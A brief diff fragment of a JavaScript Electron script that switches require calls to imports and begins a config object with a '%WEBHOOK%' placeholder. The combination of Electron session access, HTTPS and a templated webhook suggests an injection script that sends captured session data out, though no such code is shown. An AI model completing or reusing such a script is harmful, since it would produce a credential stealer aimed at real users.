@@ -1,9 +1,10 @@
-const args = process.argv;
-const fs = require('fs');
-const path = require('path');
-const https = require('https');
-const querystring = require('querystring');
-const { BrowserWindow, session } = require('electron');
+ const args = process.argv;
+import fs from 'fs';
+import path from 'path';
+import https from 'https';
+import querystring from 'querystring';
+import { BrowserWindow, session } from 'electron';
+
 
 const config = {
   webhook: '%WEBHOOK%', 
